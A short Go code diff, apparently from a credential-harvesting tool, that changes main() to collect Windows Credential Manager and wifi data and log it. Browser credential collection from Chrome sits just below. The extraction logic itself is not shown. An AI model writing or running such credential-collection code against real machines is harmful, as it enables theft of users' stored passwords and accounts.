@@ -33,15 +33,19 @@ func packWifiData(result common.ExtractWifiData, name string) []byte{
 }
 
 func main() {
+	var AllData []string
+
+	var windowsResult = windows.CredManModuleStart()
+	if windowsResult.Success{
+		var data = packWifiData(windowsResult, "windows")
+		AllData = append(AllData, string(data))
+	}
+	log.Println("["+strings.Join(AllData, ",")+"]")
 
 
-	windows.CredmanExtractDataRun()
 
 	return
-
-
 	var AllBrowsersData []common.CredentialsData
-	var AllData []string
 	if resultChrome := browsers.ChromeExtractDataRun(); resultChrome.Success{
 		AllBrowsersData = append(AllBrowsersData, resultChrome.Data...)
 	}
